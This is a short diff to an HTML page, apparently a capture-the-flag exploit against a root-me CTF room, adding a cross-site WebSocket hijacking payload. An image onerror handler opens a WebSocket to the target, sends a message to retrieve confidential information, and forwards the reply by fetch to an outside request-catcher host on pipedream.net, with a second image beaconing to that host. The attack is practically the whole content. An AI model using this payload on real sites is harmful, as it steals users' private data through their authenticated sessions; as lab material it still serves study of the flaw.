@@ -4,6 +4,19 @@
 <META HTTP-EQUIV="Access-Control-Allow-Origin" CONTENT="http://ctf21.root-me.org/room">
 
 <body>
+
+	<img src="https://en6gc9c8vfzvo.x.pipedream.net?firstImage">
+	<img src=x onerror="var ws = new WebSocket('ws://ctf21.root-me.org/ws');
+		ws.onopen = start
+		ws.onmessage = handleReply
+		function start(event) {
+		  ws.send('hello'); //Send the message to retreive confidential information
+		}
+		function handleReply(event) {
+		  //Exfiltrate the confidential information to attackers server
+		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?thi='+event.data, {mode: 'no-cors'})
+	}">
+
 	<script type="text/javascript">
 		var iframe = document.createElement('iframe');
         iframe.src = 'http://ctf21.root-me.org/room';
